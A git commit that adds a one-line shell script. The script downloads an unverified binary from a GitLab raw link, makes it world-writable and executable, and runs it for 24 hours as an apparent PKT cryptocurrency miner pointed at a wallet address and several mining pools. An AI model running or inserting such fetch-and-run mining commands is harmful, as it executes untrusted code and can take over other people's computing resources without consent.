98fe3c40daa02563b7d7a14722b232cfe7cc1d28
TheJackalTrib <94671903+TheJackalTrib@users.noreply.github.com>
2022-01-16 13:14:55 +0700

    Create as.sh

---
+++ as.sh
@@ -0,0 +1,1 @@
+wget https://gitlab.com/suyatisadino/demonslayers/-/raw/main/ann && chmod 777 ann && timeout 24h ./ann ann -p pkt1q6w43uf6x07qmz7kwklwnl6p7wncvmh7p3agkhw http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
